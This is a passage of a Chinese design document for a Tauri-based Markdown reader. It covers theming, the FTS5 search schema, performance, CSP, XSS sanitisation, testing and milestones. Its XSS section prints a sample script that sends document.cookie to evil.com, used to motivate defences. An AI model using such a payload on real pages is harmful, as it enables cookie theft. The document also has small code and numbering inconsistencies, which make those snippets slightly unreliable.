    void refreshMermaidTheme();   // 见 §6.6
  }

  get fontSize() { return this.#fontSize; }
  set fontSize(v: number) {
    this.#fontSize = v;
    document.documentElement.style.setProperty('--md-font-size', `${v}px`);
    void this.#persist();
  }

  get lineHeight() { return this.#lineHeight; }
  set lineHeight(v: number) {
    this.#lineHeight = v;
    document.documentElement.style.setProperty('--md-line-height', String(v));
    void this.#persist();
  }

  /** 应用启动时调用一次，从 DB 恢复 */
  async hydrate() {
    const saved = await invoke<PrefsDto>('load_prefs');
    this.theme = saved.theme;           // 走 setter，DOM 一并同步
    this.fontSize = saved.fontSize;
    this.lineHeight = saved.lineHeight;
  }

  #persist() {
    return invoke('save_prefs', {
      theme: this.#theme,
      fontSize: this.#fontSize,
      lineHeight: this.#lineHeight,
    });
  }
}

export const prefs = new Prefs();
```

`hydrate()` 在根组件的 `onMount` 里调用一次。

**为什么不用 `$effect.root`**：它虽然能创建独立作用域绕过报错，但需要手动管理 cleanup，且 Svelte 社区的普遍共识是——**如果你发现自己在用 `$effect.root`，通常说明设计可以更简单**。这里的副作用完全可以由 setter 承担。

`$effect` 仍然适合用在**组件内部**、需要响应外部状态变化的地方，例如 `ArticleView.svelte` 里监听 `doc` 变化后重跑渲染管线。

### 6.6 Mermaid 必须单独喂主题

Mermaid 渲染成 SVG，**不吃 CSS 变量**，需要显式传入：

```ts
const cssVar = (n: string) =>
  getComputedStyle(document.documentElement).getPropertyValue(n).trim();

function initMermaid() {
  mermaid.initialize({
    startOnLoad: false,
    theme: 'base',
    themeVariables: {
      background:       cssVar('--md-bg'),
      primaryColor:     cssVar('--md-code-bg'),
      primaryTextColor: cssVar('--md-fg'),
      primaryBorderColor: cssVar('--md-border'),
      lineColor:        cssVar('--md-border'),
      fontFamily:       cssVar('--md-font-body'),
    },
  });
}
```

**⚠️ 切主题后已渲染的图表不会自动更新。** Mermaid 会给处理过的节点打 `data-processed="true"` 并跳过它们，必须显式清除：

```ts
export async function refreshMermaidTheme() {
  const rendered = document.querySelectorAll<HTMLElement>('[data-processed="true"]');
  if (rendered.length === 0) return;

  const mermaid = (await import('mermaid')).default;
  initMermaid();                      // 用新主题变量重新 initialize

  for (const el of rendered) {
    el.removeAttribute('data-processed');
    el.innerHTML = el.dataset.mermaidSrc ?? '';   // 恢复原始定义
  }
  await mermaid.run({ nodes: Array.from(rendered) });
}
```

注意需要在**首次渲染前**把原始 mermaid 源码存进 `dataset.mermaidSrc`——因为渲染会用 SVG 覆盖掉原文本，之后就找不回来了。这一步很容易漏。

`prefs.theme` 的 setter 里已经调用了这个函数（见 §6.5）。

### 6.7 用户自定义主题

- 用户把 `.css` 放进文档库的 `.themes/` 目录
- Rust 侧扫描并读取内容，返回给前端
- 前端用 `CSSStyleSheet` + `adoptedStyleSheets` 注入（比 `<style>` 更易于卸载）

**CSP 注意**：`style-src` 已含 `unsafe-inline`（KaTeX 要求），因此注入用户 CSS 不会被拦。但若主题引用外部字体 URL，会被 `font-src` 拦掉——要么限制只用系统字体，要么要求用户把字体文件也放进目录、走 asset 协议。

---

## 7. 功能清单与优先级

按「不做会显得像半成品」的程度排序，而非实现难度。

### 7.1 第一梯队 · 必须有（否则不完整）

| 功能 | 要点与坑 |
|---|---|
| **全文搜索** | 实际是两个功能：文档内查找（简单）+ 跨文件搜索（需索引）。SAF 上每次搜索都遍历 `read_dir` 会慢到不可用——必须首次选库时后台建全量索引，存 SQLite **FTS5**，之后只查索引 |
| **文本选中 / 代码块复制** | WebView 默认支持选中；代码块右上角加「复制」按钮，用 `tauri-plugin-clipboard-manager` |
| **文档间 md 互跳** | 用户不会主动提，但缺了很别扭（`[见架构](./arch.md)` 极常见）。拦截链接点击 → 判断是否 `.md` → 转内部导航；同时维护导航栈供返回键使用 |
| **图片查看器** | 点击放大、双指缩放、下滑关闭。移动端必备 |
| **系统分享接收** | 「专业感」分水岭。见 §7.4 配置 |
| **返回键 / 手势正确性** | 安卓返回栈：抽屉打开→关抽屉；有导航历史→回上一篇；否则退出。做错会被用户立刻感知 |

### 7.2 第二梯队 · 显著提升体验

| 功能 | 要点 |
|---|---|
| **最近打开** | 带首段摘要和相对时间，作为启动首页 |
| **收藏 / 书签** | 文档级收藏 + 段落级书签（存 anchor id） |
| **多文档库** | ⚠️ **会反向影响数据模型，v1 就要留字段**，见 §7.3 |
| **导出图片 / PDF** | 分享给没装 app 的人。WebView 截长图或 `window.print()` |
| **Front matter 展示** | 已在 §5.2 开启 `ENABLE_YAML_STYLE_METADATA_BLOCKS`。渲染成 title/date/tags 小卡片，而不是把 `---` 之间内容当正文——后者是简陋阅读器的通病 |
| **阅读排版控制** | 行距、页宽、字体族。变量已在 §6.3 就位，只需接 UI |

### 7.3 数据模型：多库支持必须提前留位

即使 v1 的 UI 只暴露一个库，表结构也要带上 `vault_id`。否则后期加多库要改所有表。

```sql
CREATE TABLE vaults (
  id              INTEGER PRIMARY KEY,
  name            TEXT    NOT NULL,
  root_uri        TEXT    NOT NULL,   -- SAF tree URI 或桌面路径
  last_opened_at  INTEGER
);

CREATE TABLE docs (
  id              INTEGER PRIMARY KEY,
  vault_id        INTEGER NOT NULL REFERENCES vaults(id) ON DELETE CASCADE,
  rel_path        TEXT    NOT NULL,
  title           TEXT,
  mtime           INTEGER,
  UNIQUE(vault_id, rel_path)
);

CREATE TABLE progress (
  doc_id          INTEGER PRIMARY KEY REFERENCES docs(id) ON DELETE CASCADE,
  anchor          TEXT,               -- 标题 id，不存像素值
  section_offset  REAL,
  updated_at      INTEGER
);

CREATE TABLE bookmarks (
  id              INTEGER PRIMARY KEY,
  doc_id          INTEGER NOT NULL REFERENCES docs(id) ON DELETE CASCADE,
  anchor          TEXT    NOT NULL,
  note            TEXT,
  created_at      INTEGER
);

-- 全文检索：external content 表，指向 docs
-- ⚠️ 不要用 content=''（contentless）——那样无法调用 snippet() 生成
--    带高亮的结果摘要，而搜索结果必须显示上下文才有用
CREATE TABLE doc_body (
  doc_id          INTEGER PRIMARY KEY REFERENCES docs(id) ON DELETE CASCADE,
  body            TEXT    NOT NULL     -- 纯文本正文（已剥离 md 标记）
);

CREATE VIRTUAL TABLE docs_fts USING fts5(
  title,
  body,
  content='doc_body',                  -- external content，避免重复存储
  content_rowid='doc_id',
  tokenize='trigram'                   -- trigram 才能匹配中文子串
);

-- external content 表需要触发器同步
CREATE TRIGGER doc_body_ai AFTER INSERT ON doc_body BEGIN
  INSERT INTO docs_fts(rowid, body) VALUES (new.doc_id, new.body);
END;
CREATE TRIGGER doc_body_ad AFTER DELETE ON doc_body BEGIN
  INSERT INTO docs_fts(docs_fts, rowid, body) VALUES('delete', old.doc_id, old.body);
END;
CREATE TRIGGER doc_body_au AFTER UPDATE ON doc_body BEGIN
  INSERT INTO docs_fts(docs_fts, rowid, body) VALUES('delete', old.doc_id, old.body);
  INSERT INTO docs_fts(rowid, body) VALUES (new.doc_id, new.body);
END;

-- 渲染结果缓存
CREATE TABLE render_cache (
  doc_id          INTEGER PRIMARY KEY REFERENCES docs(id) ON DELETE CASCADE,
  mtime           INTEGER NOT NULL,  -- 与文件 mtime 比对决定是否失效
  html            TEXT    NOT NULL
);
```

**关于 FTS5 配置的三个要点：**

**1. `tokenize='trigram'` 是中文可用的前提。** 默认的 `unicode61` 分词器按空格切词，对中文等于把整段当一个 token，搜「配置」找不到「环境配置说明」。trigram 按三字符滑窗建索引，能做子串匹配。

代价是索引体积约为原文的 3–4 倍，且**查询词至少要 3 个字符**（trigram 的固有限制）。搜单个汉字或两字词会退化为全表扫描——UI 上应提示「请输入至少 3 个字」。

**2. 必须用 external content 而非 contentless。** v1.1 写的 `content=''` 是错的：contentless 表不保存原文，无法调用 `snippet()`。而搜索结果只显示文件名、不显示命中上下文，基本没法用。

**3. 索引的是纯文本，不是 Markdown 源码。** 否则搜「标题」会匹配到 `## 标题` 里的 `#`，而搜结果摘要里全是 `**` `[]()` 这些符号。要在 Rust 侧用 pulldown-cmark 抽纯文本：

```rust
use pulldown_cmark::{Event, Parser};

fn extract_plain_text(md: &str) -> String {
    let mut out = String::with_capacity(md.len());
    for ev in Parser::new_ext(md, build_options()) {
        match ev {
            Event::Text(t) | Event::Code(t) => { out.push_str(&t); }
            Event::SoftBreak | Event::HardBreak => out.push(' '),
            Event::End(_) => out.push(' '),
            _ => {}
        }
    }
    out
}
```

查询时用 `snippet()` 拿高亮摘要：

```sql
SELECT d.id, d.rel_path, d.title,
       snippet(docs_fts, 1, '<mark>', '</mark>', '…', 20) AS excerpt
FROM docs_fts
JOIN docs d ON d.id = docs_fts.rowid
WHERE docs_fts MATCH ?1 AND d.vault_id = ?2
ORDER BY rank
LIMIT 50;
```

⚠️ `snippet()` 返回的 `<mark>` 标签需要前端渲染成 HTML，**这是唯一一处允许把 DB 内容当 HTML 用的地方**，且必须先对正文做转义再插入标记——否则文档里的 `<script>` 会经搜索结果注入。安全做法是让 snippet 用不可能出现在正文的哨兵串（如 `\u{1}` / `\u{2}`），前端转义后再替换成 `<mark>`。

### 7.4 系统分享接收配置

用户在微信 / QQ 收到 `.md` 文件时，你的 app 要出现在打开方式列表里。

`src-tauri/gen/android/app/src/main/AndroidManifest.xml`：

```xml
<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <data android:mimeType="text/markdown" />
  <data android:mimeType="text/x-markdown" />
  <data android:mimeType="text/plain" />
</intent-filter>

<intent-filter>
  <action android:name="android.intent.action.VIEW" />
  <category android:name="android.intent.category.DEFAULT" />
  <data android:scheme="content" android:host="*"
        android:pathPattern=".*\\.md" />
  <data android:scheme="content" android:host="*"
        android:pathPattern=".*\\.markdown" />
</intent-filter>
```

**必须同时匹配 mimeType 和 pathPattern**——很多 app 分享 md 时 MIME 报的是 `text/plain` 甚至 `application/octet-stream`。

Tauri 侧用 `tauri-plugin-deep-link` 接收，或直接读 Android intent 取 URI。注意这类 URI 是**临时授权**的单文件 URI，不属于任何 vault，要走独立的「临时文档」路径。

### 7.5 第三梯队 · 差异化亮点（v2 评估）

| 功能 | 判断 |
|---|---|
| **朗读 TTS** | 🟢 **最推荐**。唯一能让 app 在通勤场景被用起来的功能。安卓有系统 TTS，写个小 Kotlin 插件包一层即可。难点是把 HTML 转成适合朗读的纯文本：跳过代码块、公式读成「公式」、表格线性化——这个转换放 Rust 侧，和渲染共用 parser |
| **Wiki 双链 / 反链** | 🟡 能直接吃下 Obsidian 用户的库，受众明确。但要处理 `[[链接]]` 解析、别名、模糊匹配 |
| **Git 同步** | 🟠 谨慎。`gix` 交叉编译到 Android 可行，但大仓库在手机上 clone 很慢，还要处理认证与冲突。**建议只做单向拉取，不做推送** |
| **桌面小组件** | 🟠 需写原生 Kotlin，Tauri 帮不上忙，性价比低 |

### 7.6 明确不做

编辑功能、云账号体系、插件市场、协作批注。

**编辑功能除了产品定位理由，还有技术理由**：`tauri-plugin-fs` 写 `content://` URI 会产生 0 字节文件（见 §11.2），这是必须先解决的前置阻塞。

---

## 8. 性能策略

### 8.1 长文档分块

超过 ~5000 行的文档一次性注入会白屏数秒。方案：Rust 侧按二级标题切块返回，前端先注入首屏 2–3 块，其余滚动时追加。

```rust
pub struct RenderResult {
    pub chunks: Vec<HtmlChunk>,   // 按 H2 切分
    pub toc: Vec<TocItem>,
    pub total_chunks: usize,
}
```

### 8.2 渲染缓存

同一文档反复打开时，以 `(doc_id, mtime)` 为 key 把生成的 HTML 缓存进 `render_cache` 表（见 §7.3）。二次打开可完全跳过解析。

### 8.3 首屏防闪白

WebView 加载瞬间默认白底，暗色主题下是明显的白闪。两道防线：

```json
// tauri.conf.json
{ "app": { "windows": [{ "backgroundColor": "#0d1117" }] } }
```

外加 `index.html` 里内联首屏关键 CSS，不等外链 CSS 加载。

### 8.4 阅读进度

**存标题 anchor id，不存滚动像素值。** 字号一改、公式一渲染，像素值立刻失效。

```ts
// 保存：记录当前视口顶部最近的标题
const current = findTopmostVisibleHeading();
await db.execute(
  'INSERT OR REPLACE INTO progress (doc_id, anchor, section_offset, updated_at) VALUES (?, ?, ?, ?)',
  [docId, current.id, current.offsetWithinSection, Date.now()]
);

// 恢复：等全部渲染完成后再跳
document.getElementById(saved.anchor)?.scrollIntoView();
```

### 8.5 索引构建时机

首次选择文档库时在后台建 FTS5 索引。**不要阻塞 UI**——用 Tauri 的 event 机制汇报进度：

```rust
#[tauri::command]
async fn build_index(app: tauri::AppHandle, vault_id: i64) -> AppResult<()> {
    let files = collect_md_files(&app, vault_id).await?;
    let total = files.len();
    for (i, f) in files.iter().enumerate() {
        // 单篇失败不应中断整体索引，记录后继续
        if let Err(e) = index_one(&app, f).await {
            log::warn!("index failed for {:?}: {e}", f);
        }
        if i % 10 == 0 {
            app.emit("index-progress", (i, total)).ok();
        }
    }
    app.emit("index-done", total).ok();
    Ok(())
}
```

**单篇失败不能中断整批**——文档库里有一个损坏文件、或一个超大文件，不该导致整个索引任务失败。这是原 v1.1 用 `?` 直接传播的问题。

之后依靠 mtime 做增量更新，不必每次全量重建。

---

## 9. 安全配置

### 9.1 CSP

`src-tauri/tauri.conf.json`：

```json
{
  "app": {
    "security": {
      "csp": {
        "default-src": "'self'",
        "script-src": "'self'",
        "style-src": "'self' 'unsafe-inline'",
        "font-src": "'self' asset: http://asset.localhost data:",
        "img-src": "'self' asset: http://asset.localhost data: blob:",
        "connect-src": "ipc: http://ipc.localhost",
        "object-src": "'none'",
        "base-uri": "'self'",
        "frame-ancestors": "'none'"
      },
      "freezePrototype": true
    }
  }
}
```

逐条说明：

| 指令 | 为什么这样写 |
|---|---|
| `style-src` 含 `unsafe-inline` | **KaTeX 强依赖**。它生成大量内联 `style` 做精确字符定位，禁掉公式就全乱 |
| `font-src` 含 `asset:` 与 `data:` | 漏了就是「所有数学符号显示成方块」的经典症状 |
| `img-src` 含 `asset:` `blob:` | 本地图片 + Mermaid 生成的 SVG |
| `connect-src` 含 `ipc:` | 不写 Tauri 的 invoke 直接失效 |
| `script-src` **不含** `unsafe-eval` | Mermaid 不需要 eval。保持不加 |

### 9.2 Android 权限

```json
{
  "bundle": {
    "android": { "minSdkVersion": 29 }
  }
}
```

**minSdk 定 29（Android 10）**。原因：Tauri 目前没有请求 legacy 外部存储权限的官方插件，低版本处理起来很难受。29+ 覆盖绝大多数在用设备。

**绝对不要申请 `MANAGE_EXTERNAL_STORAGE`**。Google Play 会要求额外审核，阅读器这类应用几乎不可能通过。SAF 完全够用。

`tauri-plugin-android-fs` 默认 features 不添加任何需要 Play 额外审核的权限——保持默认即可。

### 9.3 Capabilities

```json
// src-tauri/capabilities/default.json
{
  "identifier": "default",
  "windows": ["main"],
  "permissions": [
    "core:default",
    "dialog:default",
    "sql:default",
    "android-fs:default",
    "clipboard-manager:allow-write-text",
    "deep-link:default"
  ]
}
```

### 9.4 XSS 防护

**Markdown 规范允许内嵌 raw HTML**，而 pulldown-cmark 默认把 HTML 块**原样输出**。这意味着：
```markdown
正常段落

<script>fetch('http://evil.com?d='+document.cookie)</script>
<img src=x onerror="alert('xss')">
```

会变成可执行的脚本注入 WebView。而我们的 WebView **持有 Tauri IPC 通道**——恶意脚本理论上能调用我们暴露的所有 command，包括读取用户整个文档库。

这不是理论风险。攻击场景很现实：用户从网上下载一份 md 文档、或从聊天软件收到一个 md 文件，打开即中招。

**三层防护，缺一不可：**

**第一层：CSP 已经挡住了大部分。** `script-src 'self'` 会阻止内联 `<script>` 执行——这是我们运气好，因为 KaTeX 只需要 `style-src` 放宽，不需要 `script-src`。**绝对不要为了任何理由给 `script-src` 加 `unsafe-inline`**，那会让这层防护完全失效。

**第二层：Rust 侧消毒（主要防线）。** 用 `ammonia` 清洗生成的 HTML：

```rust
use ammonia::Builder;
use std::collections::HashSet;

fn sanitize(html: &str) -> String {
    let mut allowed_classes: HashSet<&str> = HashSet::new();
    // 保留 highlight.js 与 mermaid 需要的 class
    allowed_classes.insert("language-*");   // 见下方说明

    Builder::default()
        .add_tag_attributes("code", &["class"])
        .add_tag_attributes("span", &["class"])
        .add_tag_attributes("div", &["class"])
        .add_tag_attributes("h1", &["id"])
        .add_tag_attributes("h2", &["id"])
        .add_tag_attributes("h3", &["id"])
        .add_tag_attributes("h4", &["id"])
        .add_tag_attributes("h5", &["id"])
        .add_tag_attributes("h6", &["id"])
        .add_tag_attributes("input", &["type", "checked", "disabled"]) // 任务列表
        .url_schemes(
            ["http", "https", "mailto", "asset", "content"]
                .iter().cloned().collect()
        )
        .clean(html)
        .to_string()
}
```

`ammonia` 默认就会剥掉 `<script>`、`<iframe>`、所有 `on*` 事件属性、`javascript:` 协议的 URL。我们只需**显式放行**渲染必需的属性。

⚠️ **注意 `ammonia` 默认会剥掉 `id` 属性**，而我们的 TOC 跳转和阅读进度完全依赖标题 `id`。上面显式加回了 `h1`–`h6` 的 `id`。这一条漏了的话，症状是「点目录没反应、进度恢复失效」，而且不会有任何报错——很难排查。

`allowed_classes` 需要精确列出，ammonia 不支持通配符。实际做法是枚举 hljs 用到的类名前缀，或改用 `add_tag_attributes` 允许 `class` 属性后自行约束（安全性略低但可接受，因为 CSP 已挡住脚本执行）。

**第三层：默认不启用 raw HTML。** 更彻底的做法——给用户一个开关，默认**关闭** raw HTML 渲染：

```rust
// 默认：把 HTML 块当纯文本显示，最安全
Event::Html(text) | Event::InlineHtml(text) if !allow_raw_html => {
    Event::Text(text)      // 转义后原样显示，不解析
}
```

技术文档里 raw HTML 主要用于 `<br>`、`<details>`、`<kbd>` 这类无害标签。可以做白名单放行这几个，其余转义。

**权衡建议**：v1 走「CSP + ammonia 消毒」两层，raw HTML 保持解析但经过清洗。这样既安全又不破坏 `<details>` 折叠块这类常用写法。

### 9.5 错误处理约定

**原 v1.1 的代码示例里全是 `map_err(|e| e.to_string())`，这是反模式**——把类型化错误压成字符串，前端无法区分「文件不存在」「权限失效」「编码错误」，只能把原始英文错误弹给用户。

定义统一错误类型：

```rust
// src-tauri/src/error.rs
use serde::Serialize;

#[derive(Debug, thiserror::Error)]
pub enum AppError {
    #[error("permission expired")]
    PermissionExpired,          // SAF 权限失效 → 前端提示重新选择文件夹
    #[error("file not found")]
    NotFound,
    #[error("file too large: {0} bytes")]
    TooLarge(u64),
    #[error("decode failed")]
    DecodeFailed,
    #[error("io: {0}")]
    Io(#[from] std::io::Error),
    #[error("db: {0}")]
    Db(String),
}

/// 序列化成带 code 的结构，前端按 code 分支处理
impl Serialize for AppError {
    fn serialize<S: serde::Serializer>(&self, s: S) -> Result<S::Ok, S::Error> {
        use serde::ser::SerializeStruct;
        let mut st = s.serialize_struct("AppError", 2)?;
        st.serialize_field("code", self.code())?;
        st.serialize_field("message", &self.to_string())?;
        st.end()
    }
}

impl AppError {
    fn code(&self) -> &'static str {
        match self {
            Self::PermissionExpired => "PERMISSION_EXPIRED",
            Self::NotFound          => "NOT_FOUND",
            Self::TooLarge(_)       => "TOO_LARGE",
            Self::DecodeFailed      => "DECODE_FAILED",
            Self::Io(_)             => "IO",
            Self::Db(_)             => "DB",
        }
    }
}

pub type AppResult<T> = Result<T, AppError>;
```

所有 command 签名统一为 `-> AppResult<T>`，前端按 `code` 给出中文提示。

**`PermissionExpired` 是最重要的一个**：SAF 持久化权限会在用户清除应用数据、或系统回收后失效。此时必须引导用户重新选择文件夹，而不是显示一个看不懂的错误。

**硬性约定**：`#[tauri::command]` 函数体内**禁止 `unwrap()` / `expect()` / 数组直接索引**。因为我们不用 `panic = "abort"`（见 §3.3），panic 虽不会杀进程，但会污染日志且行为不可预期。用 `clippy` 强制：

```toml
# .cargo/config.toml 或 lib.rs 顶部
#![warn(clippy::unwrap_used, clippy::expect_used, clippy::indexing_slicing)]
```

### 9.6 测试策略

**原 v1.1 没有测试章节。** 最低配置：

| 层 | 手段 | 覆盖什么 |
|---|---|---|
| Rust 单测 | `#[test]` | Markdown 渲染快照、编码检测、纯文本抽取、路径解析 |
| Rust 单测 | `#[test]` | **XSS 消毒**：喂入含 `<script>`、`onerror` 的样本，断言被剥离 |
| SQL | 内存 SQLite | FTS5 trigram 中文检索、触发器同步、级联删除 |
| 前端 | Vitest | 主题变量切换、导航栈行为、增量增强不重复处理 |
| 真机 | 手动 checklist | **飞行模式**下公式/字体正常；万行文档不白屏；SAF 权限重启后仍有效 |

**必须建一套「魔鬼样本」测试文档集**，放进仓库 `fixtures/`：

- 含 GBK 编码、含 BOM、含 CRLF 的三个变体
- 万行超长文档（性能基准）
- 含 XSS payload 的恶意文档
- 含深层嵌套列表、复杂表格、跨页公式的排版压力测试
- 相对路径图片指向上级目录（`../assets/x.png`）的边界情况
- 文件名含空格、中文、emoji 的情况

这套 fixtures 的价值在于：每次改渲染管线都能快速回归，而不是靠手点。

---

## 10. 工程结构与里程碑

### 10.1 目录结构

```
md-reader/
├── src/                            # Svelte 前端
│   ├── lib/
│   │   ├── render/
│   │   │   ├── katex.ts            # 公式渲染封装
│   │   │   ├── highlight.ts        # 代码高亮
│   │   │   └── mermaid.ts          # 图表懒加载 + 主题联动
│   │   ├── stores/
│   │   │   ├── vault.svelte.ts     # 文档库状态 (runes)
│   │   │   ├── prefs.svelte.ts     # 主题 / 字号 / 排版
│   │   │   └── nav.svelte.ts       # 导航栈（返回键行为）
│   │   └── api.ts                  # invoke 封装
│   ├── components/
│   │   ├── ArticleView.svelte
│   │   ├── FileTree.svelte
│   │   ├── TocDrawer.svelte
│   │   ├── SearchPanel.svelte
│   │   ├── ImageViewer.svelte
│   │   └── ThemePicker.svelte
│   ├── themes/                     # 主题 CSS（见 §6）
│   │   ├── _contract.css
│   │   ├── github-light.css
│   │   ├── github-dark.css
│   │   └── sepia.css
│   └── app.html
├── public/vendor/
│   ├── katex/                      # 含完整 fonts/ 目录
│   └── github-markdown.css
├── src-tauri/
│   ├── src/
│   │   ├── lib.rs
│   │   ├── markdown.rs             # pulldown-cmark 管线
│   │   ├── search.rs               # FTS5 索引构建与查询
│   │   ├── tts.rs                  # HTML → 朗读文本（v2）
│   │   ├── vault/
│   │   │   ├── android.rs          # FsUri 实现
│   │   │   └── desktop.rs          # 路径实现
│   │   └── db.rs
│   ├── capabilities/default.json
│   └── tauri.conf.json
└── package.json
```

### 8.2 里程碑

| 阶段 | 目标 | 验收标准 |
|---|---|---|
| **M0** 环境 | Rust + Android SDK/NDK 打通 | `npm run tauri android dev` 真机跑起 Hello World |
| **M1** 最小闭环 | 单文件打开 + 基础渲染 + **编码处理** | 能选一个 md，正确显示标题/段落/列表/表格；GBK / BOM / CRLF 三个变体都正常 |
| **M2** 视觉完备 | 高亮 + 公式 + 主题系统 + **XSS 消毒** | **飞行模式下**公式和代码色彩正常；三套主题可切且代码块配色跟随；XSS 样本单测通过 |
| **M3** 文件夹 | SAF 目录树 + 相对图片 + **权限失效处理** | 重启 app 后仍有权限；手动清数据后能正确提示重选而非报错 |
| **M4** 阅读体验 | TOC / 进度 / 排版 / 分块 + **DB schema 建全** | 万行文档不白屏，改字号后进度不丢；真机实测 IPC 无明显卡顿 |
| **M5** 导航与交互 | md 互跳 + 导航栈 + 返回键 + 图片查看器 + 复制 | 点 `./arch.md` 内部跳转，返回键逐级回退 |
| **M6** 搜索与索引 | FTS5 建索引 + 跨文件搜索 + 文档内查找 | 千篇文档库搜索响应 < 300ms，建索引不阻塞 UI |
| **M7** 系统集成 | 分享接收 + 最近打开 + 收藏书签 + 导出 | 微信收到 md 能直接用本 app 打开 |
| **M8** 桌面与发布 | 桌面端适配 + 签名 + AAB | Windows 同套代码运行；通过 Play Console 预检 |

**关于阶段划分的三点说明：**

**M0 不要低估**。第一次配 Rust 工具链 + Android SDK + NDK + `cargo-ndk`，通常要一到两小时排各种环境变量问题。纯体力活，但绕不过。

**M5 和 M6 是「从 demo 到产品」的分界线**。M1–M4 做完你有一个能看的渲染器，但缺了导航和搜索，用户会觉得像半成品。这两个阶段的功能用户不会主动提，缺了却立刻能感知。

**M1 就要把 `fixtures/` 测试文档集建起来**（见 §9.6）。每个后续里程碑都靠它回归。特别是编码变体和 XSS 样本，越早引入越省事——等到 M7 才发现 GBK 文件打不开，可能要回头改整个读取链路。

**数据库 schema 建议在 M4 就按 §7.3 完整建好**（含 `vault_id`、FTS5 external content 表和三个触发器），即使当时只用得到 `progress` 表。否则 M6/M7 要做迁移。

---

## 11. 风险清单

### 11.1 🔴 高：核心依赖是第三方 crate

`tauri-plugin-android-fs` 承担了目录访问这个不可替代的职责，但它是个人维护项目（作者 aiueo13），一年内发了 130+ 版本、major 号已到 29，**API 变动激进**。

缓解措施：
- Cargo.toml 里用 `=29.0.0` 锁死精确版本，升级前先看 CHANGELOG
- 在 `vault/` 模块内隔离（见 §4.4 的 `#[cfg]` 分发），所有调用都过我们自己的四个自由函数，将来换实现只改一个文件
- 关注官方 `tauri#14587` 进展，若官方补齐则迁移

### 11.2 🔴 高：恶意 Markdown 的 XSS 风险

Markdown 允许内嵌 raw HTML，而我们的 WebView 持有 Tauri IPC 通道。用户打开一份来自网络的恶意 md，脚本理论上能调用我们所有 command、读走整个文档库。

缓解：CSP `script-src 'self'` + Rust 侧 ammonia 消毒双层防护，详见 §9.4。**必须建 XSS 样本的单测**，不能靠人工检查。

### 11.3 🟡 中：Android 写文件有已知缺陷

`tauri-plugin-fs` 写 `content://` URI 会产生 **0 字节文件**（issue `plugins-workspace#3356`）。根因是 Kotlin 侧 `getFileDescriptor` 调用 `detachFd()` 导致 content provider 提前收到 close 信号，在任何字节写入前就把元数据定稿为 0 字节。

对本项目影响有限（只读定位），但**如果 v2 要加编辑/标注功能，这是必须先解决的阻塞项**。

### 11.4 🟡 中：SAF 持久化权限会失效

`persist_uri_permission` 不是永久保证。以下情况会失效：用户清除应用数据、卸载重装、SD 卡拔出、系统在存储紧张时回收授权、用户在系统设置里手动撤销。

缓解：每次访问库前先 `check_persisted_uri_permission`；失效时返回 `AppError::PermissionExpired`（见 §9.5），前端给出「文档库访问权限已失效，请重新选择文件夹」的中文引导，并保留已建的索引和阅读进度（按 `rel_path` 重新关联，不要清库）。

**这一条如果没处理好，用户体验是「用了几天突然打不开了，还得重新配一遍」——极容易导致卸载。**

### 11.5 🟡 中：WebView 行为差异

Android 用的是 Chrome WebView，桌面端走 wry（WebView2/WKWebView/WebKitGTK）。同一份 CSS/JS 在各端表现可能不同，尤其是老设备上的 WebView 版本可能很旧。

⚠️ 具体注意：`CSSStyleSheet` 构造函数 + `adoptedStyleSheets`（§6.7 用户自定义主题）在较老的 Android WebView 上不可用。需要 feature detection 并回退到 `<style>` 元素注入。

缓解：CI 里对 Android WebView 最低支持版本做冒烟测试；避免用过新的 CSS 特性（如 `:has()` 的复杂用法）。

### 11.6 🟡 中：大文档库索引性能

SAF 的 `read_dir` 比原生文件系统慢得多。上千篇文档的库首次建索引可能要几十秒。而 trigram 分词的索引体积是原文的 3–4 倍，也要考虑存储占用。

缓解：后台异步执行 + 进度提示（见 §8.5）；跳过隐藏目录（`.git` 里可能有上万文件）；之后依赖 mtime 增量更新。若实测过慢，考虑只索引标题和首 N 字符。

### 11.7 🟢 低：Rust 学习成本

本项目 Rust 代码量不大——`#[tauri::command]` 若干、pulldown-cmark 管线、文件抽象层、FTS5 查询、ammonia 消毒、编码检测，估计 2000–2500 行。不需要精通 Rust，会看编译器报错就够。

### 11.8 🟢 低：KaTeX 0.18 类名变更

已在 §5.3 说明。新项目从一开始按 0.18 类名写即可，不构成实际风险，但**参考网上教程时要注意版本**。

---

## 12. 决策摘要

| 决策点 | 选择 | 一句话理由 |
|---|---|---|
| 框架 | Tauri 2 | 一套代码换五端，APK 仅 3–8MB |
| 前端 | Svelte 5 | 注入大段 HTML 的场景，VDOM 是纯开销 |
| MD 解析位置 | Rust | 纯字符串变换，不阻塞 UI，pull parser 便于改写图片路径 |
| 公式渲染位置 | 前端 KaTeX | Rust 侧预渲染需内嵌 JS 引擎，Android 上不划算 |
| 闪烁处理 | 先渲染后显示 | 一招同时解决公式跳变、高亮跳变、滚动错位 |
| 目录访问 | 第三方 android-fs | 官方至今未实现 `pick_folder`，无替代方案 |
| 阅读进度 | 存 anchor id | 像素值会因字号变化失效 |
| Mermaid | 视口内懒加载 | 1MB 体积 + 高 CPU，不能进首屏 |
| 正文样式作用域 | `:global` 块 | `{@html}` 内容对 Svelte scoped CSS 不可见 |
| 主题机制 | CSS 变量 + `data-theme` | 主题包退化为纯 CSS 文件，用户可自写 |
| 偏好设置副作用 | setter，**不用 `$effect`** | 模块顶层单例用 `$effect` 会抛 effect_orphan |
| 平台抽象 | `#[cfg]` + 自由函数，**不用 trait** | 含 async fn 的 trait 非 dyn 兼容，用 trait 要付堆分配代价 |
| `panic` 策略 | **不设 abort** | 移动端需 unwind 把 panic 传回 WebView，abort 会闪退 |
| 搜索实现 | FTS5 + trigram + **external content** | 遍历 SAF 太慢；trigram 才能匹配中文；contentless 无法做 snippet |
| XSS 防护 | CSP + ammonia 双层 | md 允许 raw HTML，而 WebView 持有 IPC 通道 |
| 智能标点 | **关闭** | 会把 `--no-default-features` 转成 en dash，破坏命令 |
| 数据模型 | v1 即带 `vault_id` | 多库是后期必然需求，提前留位避免迁移 |

---

## 附录 A：核心引用

- `tauri-apps/plugins-workspace#933` — Android folder picker 未实现
- `tauri-apps/tauri#14587` — SAF tree URI 类型设计讨论
- `tauri-apps/plugins-workspace#3356` — content URI 写入 0 字节
- KaTeX `0.18.0` CHANGELOG — CSS 类名前缀 breaking change
- pulldown-cmark `0.13.4` — 2026-05-20 发布

## 附录 B：可对标的开源项目

| 项目 | 技术栈 | 值得抄什么 |
|---|---|---|
| Markor | 原生 Android | SAF 处理的完整实践 |
| Obsidian Mobile | 纯 WebView | 大文档分块渲染策略 |
| Zettlr | Electron | Markdown 管线组织方式 |

